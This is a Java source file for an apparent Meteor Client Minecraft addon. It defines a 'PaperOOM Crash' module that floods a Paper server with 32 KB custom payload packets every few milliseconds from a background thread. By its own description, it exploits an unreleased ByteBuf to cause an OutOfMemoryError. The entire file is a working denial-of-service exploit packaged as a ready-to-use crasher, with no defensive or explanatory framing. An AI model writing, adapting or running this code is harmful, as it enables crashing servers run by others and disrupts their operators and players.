package com.x310.clarity.features.crashers.impl;

import com.x310.clarity.Main;
import com.x310.clarity.features.crashers.Crasher;
import com.x310.clarity.utils.payload.PaperCustomPayload;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;

public class PaperOOMCrash extends Crasher {


    private void stopOomThread() {
        running = false;
        thread = null;
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (disableOnLeave.get()) {
            toggle();
        }
    }

    private final Setting<Integer> interval = sg.add(new IntSetting.Builder()
        .name("Delay")
        .description("Milliseconds between packets.")
        .defaultValue(2)
        .min(2)
        .max(10)
        .sliderMax(10)
        .build()
    );

    private Thread thread;
    private volatile boolean running = false;
    private final byte[] emptyBuf = new byte[32000];

    public PaperOOMCrash() {
        super(Main.CRASH_GROUP, "PaperOOM Crash", "Abuses a flaw where a ByteBuf is not properly released to cause OutOfMemoryError");
    }

    @Override
    public void onActivate() {
        running = true;
        thread = new Thread(() -> {
            if (mc.player == null || mc.getNetworkHandler() == null) return;
            ClientPlayNetworkHandler handler = mc.getNetworkHandler();
            CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(new PaperCustomPayload(emptyBuf));

            while (running) {
                try {
                    handler.sendPacket(packet);
                    Thread.sleep(interval.get());
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
        thread.setName("PaperOOMCrash-Thread");
        thread.setDaemon(true);
        thread.start();
    }

    @Override
    public void onDeactivate() {
        stopOomThread();
    }
}
